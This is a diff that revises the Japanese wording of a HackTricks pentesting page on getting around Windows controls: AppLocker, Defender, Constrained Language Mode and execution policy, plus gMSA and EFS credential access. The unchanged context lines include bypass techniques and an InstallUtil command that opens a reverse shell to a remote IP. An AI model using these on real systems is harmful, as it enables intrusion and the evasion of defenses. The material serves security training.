@@ -26,8 +26,8 @@ Get Access Today:
 
 アプリケーションホワイトリストは、システム上で存在し実行されることが許可された承認済みのソフトウェアアプリケーションまたは実行可能ファイルのリストです。目的は、環境を有害なマルウェアや、組織の特定のビジネスニーズに合致しない未承認のソフトウェアから保護することです。
 
-[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker)は、マイクロソフトの**アプリケーションホワイトリストソリューション**であり、システム管理者に**ユーザーが実行できるアプリケーションやファイルを制御する**権限を与えます。これは、実行可能ファイル、スクリプト、Windowsインストーラファイル、DLL、パッケージアプリ、パックされたアプリインストーラに対して**詳細な制御**を提供します。\
-組織が**cmd.exeやPowerShell.exeをブロックし**、特定のディレクトリへの書き込みアクセスを制限することは一般的ですが、**これらはすべて回避可能です**。
+[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker)は、マイクロソフトの**アプリケーションホワイトリストソリューション**であり、システム管理者に**ユーザーが実行できるアプリケーションとファイルを制御する**権限を与えます。これは、実行可能ファイル、スクリプト、Windowsインストーラファイル、DLL、パッケージアプリ、パックされたアプリインストーラに対して**詳細な制御**を提供します。\
+組織が**cmd.exeとPowerShell.exeをブロックし**、特定のディレクトリへの書き込みアクセスを制限することは一般的ですが、**これらはすべて回避可能です**。
 
 ### Check
 
@@ -53,12 +53,12 @@ C:\Windows\System32\spool\drivers\color
 C:\Windows\Tasks
 C:\windows\tracing
 ```
-* 一般的に**信頼された** [**"LOLBAS's"**](https://lolbas-project.github.io/) バイナリは、AppLockerをバイパスするのにも役立ちます。
-* **不適切に書かれたルールもバイパスされる可能性があります**
+* 一般的に**信頼された** [**"LOLBAS's"**](https://lolbas-project.github.io/) バイナリは、AppLockerを回避するのにも役立ちます。
+* **不適切に書かれたルールも回避される可能性があります**
 * 例えば、**`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`** の場合、どこにでも**`allowed`**という**フォルダーを作成**すれば許可されます。
-* 組織はしばしば**`%System32%\WindowsPowerShell\v1.0\powershell.exe`** 実行可能ファイルを**ブロックすることに焦点を当てますが、**他の** [**PowerShell実行可能ファイルの場所**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations)（例：`%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe`や`PowerShell_ISE.exe`）を忘れがちです。
-* **DLLの強制は非常に稀に有効**であり、システムにかかる追加の負荷や、何も壊れないことを確認するために必要なテストの量が理由です。したがって、**DLLをバックドアとして使用することでAppLockerをバイパスするのに役立ちます**。
-* [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)や[**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)を使用して、**任意のプロセスでPowershell**コードを**実行し、AppLockerをバイパスする**ことができます。詳細については、[こちらを確認してください](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)。
+* 組織はしばしば**`%System32%\WindowsPowerShell\v1.0\powershell.exe`** 実行可能ファイルの**ブロック**に焦点を当てますが、**他の** [**PowerShell実行可能ファイルの場所**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations)（例えば、`%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe`や`PowerShell_ISE.exe`）を忘れがちです。
+* **DLLの強制は非常に稀に有効**であり、システムにかかる追加の負荷や、何も壊れないことを確認するために必要なテストの量が理由です。したがって、**DLLをバックドアとして使用することでAppLockerを回避するのに役立ちます**。
+* [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)や[**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)を使用して、**任意のプロセスでPowershell**コードを**実行し、AppLockerを回避**できます。詳細については、[こちらを確認してください](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)。
 
 ## 資格情報の保存
 
@@ -89,11 +89,11 @@ LSAはディスクにいくつかの資格情報を保存することがあり�
 
 ## ディフェンダー
 
-[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender)は、Windows 10およびWindows 11、そしてWindows Serverのバージョンで利用可能なアンチウイルスです。**一般的なペンテストツール（例：**`WinPEAS`**）を**ブロック**します。しかし、これらの保護を**バイパスする方法**があります。
+[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender)は、Windows 10およびWindows 11、そしてWindows Serverのバージョンで利用可能なアンチウイルスです。**一般的なペンテストツール**（例：**`WinPEAS`**）を**ブロック**します。しかし、これらの保護を**回避する方法**があります。
 
 ### チェック
 
-**Defender**の**ステータス**を確認するには、PSコマンドレット**`Get-MpComputerStatus`**を実行できます（**`RealTimeProtectionEnabled`**の値を確認して、アクティブかどうかを知ります）：
+**Defender**の**ステータス**を確認するには、PSコマンドレット**`Get-MpComputerStatus`**を実行できます（**`RealTimeProtectionEnabled`**の値を確認して、アクティブかどうかを知る）：
 
 <pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus
 
@@ -123,7 +123,7 @@ sc query windefend
 ```
 ## Encrypted File System (EFS)
 
-EFSは、**対称鍵**である**ファイル暗号化鍵（FEK）**を使用してファイルを暗号化することで保護します。この鍵はユーザーの**公開鍵**で暗号化され、暗号化されたファイルの$EFS **代替データストリーム**内に保存されます。復号が必要な場合、ユーザーのデジタル証明書の対応する**秘密鍵**を使用して$EFSストリームからFEKを復号します。詳細は[こちら](https://en.wikipedia.org/wiki/Encrypting\_File\_System)で確認できます。
+EFSは、**対称鍵**である**ファイル暗号化キー（FEK）**を使用してファイルを暗号化します。この鍵はユーザーの**公開鍵**で暗号化され、暗号化されたファイルの$EFS **代替データストリーム**内に保存されます。復号が必要な場合、ユーザーのデジタル証明書の対応する**秘密鍵**を使用して$EFSストリームからFEKを復号します。詳細は[こちら](https://en.wikipedia.org/wiki/Encrypting\_File\_System)で確認できます。
 
 **ユーザーの操作なしでの復号シナリオ**には以下が含まれます：
 
@@ -135,7 +135,7 @@ EFSは、**対称鍵**である**ファイル暗号化鍵（FEK）**を使用し
 **重要なポイント**：
 
 * EFSは、ユーザーの公開鍵で暗号化された対称FEKを使用します。
-* 復号にはユーザーの秘密鍵を使用してFEKにアクセスします。
+* 復号には、ユーザーの秘密鍵を使用してFEKにアクセスします。
 * FAT32へのコピーやネットワーク送信など、特定の条件下で自動的に復号が行われます。
 * 暗号化されたファイルは、追加の手順なしで所有者がアクセスできます。
 
@@ -150,7 +150,7 @@ EFSは、**対称鍵**である**ファイル暗号化鍵（FEK）**を使用し
 
 #### 権限のあるシステムであること
 
-この方法では、**被害者ユーザー**がホスト内で**プロセス**を**実行している**必要があります。その場合、`meterpreter`セッションを使用してユーザーのプロセスのトークンを偽装することができます（`incognito`の`impersonate_token`）。または、ユーザーのプロセスに`migrate`することもできます。
+この方法では、**被害者ユーザー**がホスト内で**プロセス**を**実行**している必要があります。その場合、`meterpreter`セッションを使用してユーザーのプロセスのトークンを偽装することができます（`incognito`の`impersonate_token`）。または、ユーザーのプロセスに`migrate`することもできます。
 
 #### ユーザーのパスワードを知っていること
 
@@ -161,12 +161,12 @@ EFSは、**対称鍵**である**ファイル暗号化鍵（FEK）**を使用し
 Microsoftは、ITインフラストラクチャにおけるサービスアカウントの管理を簡素化するために**グループ管理サービスアカウント（gMSA）**を開発しました。従来のサービスアカウントは「**パスワードは期限切れにならない**」設定が有効であることが多いのに対し、gMSAはより安全で管理しやすいソリューションを提供します：
 
 * **自動パスワード管理**：gMSAは、ドメインまたはコンピュータポリシーに応じて自動的に変更される複雑な240文字のパスワードを使用します。このプロセスはMicrosoftのキー配布サービス（KDC）によって処理され、手動でのパスワード更新が不要になります。
-* **強化されたセキュリティ**：これらのアカウントはロックアウトに対して免疫があり、対話的ログインに使用できないため、セキュリティが向上します。
+* **強化されたセキュリティ**：これらのアカウントはロックアウトに対して免疫があり、対話的なログインには使用できないため、セキュリティが向上します。
 * **複数ホストのサポート**：gMSAは複数のホストで共有できるため、複数のサーバーで実行されるサービスに最適です。
 * **スケジュールされたタスクの実行能力**：管理されたサービスアカウントとは異なり、gMSAはスケジュールされたタスクの実行をサポートします。
-* **簡素化されたSPN管理**：コンピュータのsAMaccountの詳細やDNS名に変更があった場合、システムは自動的にサービスプリンシパル名（SPN）を更新し、SPN管理を簡素化します。
+* **SPN管理の簡素化**：コンピュータのsAMaccountの詳細やDNS名に変更があった場合、システムは自動的にサービスプリンシパル名（SPN）を更新し、SPN管理を簡素化します。
 
-gMSAのパスワードはLDAPプロパティ_**msDS-ManagedPassword**_に保存され、ドメインコントローラー（DC）によって30日ごとに自動的にリセットされます。このパスワードは、[MSDS-MANAGEDPASSWORD\_BLOB](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e)として知られる暗号化データブロブであり、認可された管理者とgMSAがインストールされているサーバーのみが取得できるため、安全な環境が確保されます。この情報にアクセスするには、LDAPSのような安全な接続が必要であるか、接続は「Sealing & Secure」で認証される必要があります。
+gMSAのパスワードはLDAPプロパティ_**msDS-ManagedPassword**_に保存され、ドメインコントローラー（DC）によって30日ごとに自動的にリセットされます。このパスワードは、[MSDS-MANAGEDPASSWORD\_BLOB](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e)として知られる暗号化データブロブであり、認可された管理者とgMSAがインストールされているサーバーのみが取得できます。これにより、安全な環境が確保されます。この情報にアクセスするには、LDAPSのような安全な接続が必要であるか、接続は「Sealing & Secure」で認証される必要があります。
 
 ![https://cube0x0.github.io/Relaying-for-gMSA/](../.gitbook/assets/asd1.png)
 
@@ -176,7 +176,7 @@ gMSAのパスワードはLDAPプロパティ_**msDS-ManagedPassword**_に保存�
 ```
 [**この投稿で詳細情報を見つける**](https://cube0x0.github.io/Relaying-for-gMSA/)
 
-また、**gMSA**の**パスワード**を**読み取る**ための**NTLMリレー攻撃**を実行する方法についての[このウェブページ](https://cube0x0.github.io/Relaying-for-gMSA/)も確認してください。
+また、**gMSA**の**パスワード**を**読み取る**ための**NTLMリレー攻撃**を実行する方法についての[ウェブページ](https://cube0x0.github.io/Relaying-for-gMSA/)も確認してください。
 
 ## LAPS
 
@@ -188,7 +188,7 @@ gMSAのパスワードはLDAPプロパティ_**msDS-ManagedPassword**_に保存�
 
 ## PS制約付き言語モード
 
-PowerShell [**制約付き言語モード**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/)は、COMオブジェクトのブロック、承認された.NETタイプのみの許可、XAMLベースのワークフロー、PowerShellクラスなど、PowerShellを効果的に使用するために必要な多くの機能を**制限**します。
+PowerShellの[**制約付き言語モード**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/)は、COMオブジェクトのブロック、承認された.NETタイプのみの許可、XAMLベースのワークフロー、PowerShellクラスなど、PowerShellを効果的に使用するために必要な多くの機能を**制限**します。
 
 ### **確認**
 ```powershell
@@ -211,11 +211,11 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogTo
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
 ```
-You can use [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) or [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) to **execute Powershell** コードを任意のプロセスで実行し、制約モードをバイパスします。詳細については、次を確認してください: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).
+[**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) または [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) を使用して、任意のプロセスで **Powershell** コードを **実行** し、制約モードを回避できます。詳細については、次を確認してください: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)。
 
 ## PS 実行ポリシー
 
-デフォルトでは **restricted** に設定されています。このポリシーをバイパスする主な方法:
+デフォルトでは **制限付き** に設定されています。このポリシーを回避する主な方法:
 ```powershell
 1º Just copy and paste inside the interactive PS console
 2º Read en Exec
@@ -278,15 +278,15 @@ SSPIは、通信を希望する2台のマシンに適切なプロトコルを見
 
 {% hint style="success" %}
 AWSハッキングを学び、実践する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+GCPハッキングを学び、実践する： <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>HackTricksをサポートする</summary>
 
 * [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
-* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
-* **ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**
+* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
+* **[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してハッキングトリックを共有してください。**
 
 </details>
 {% endhint %}
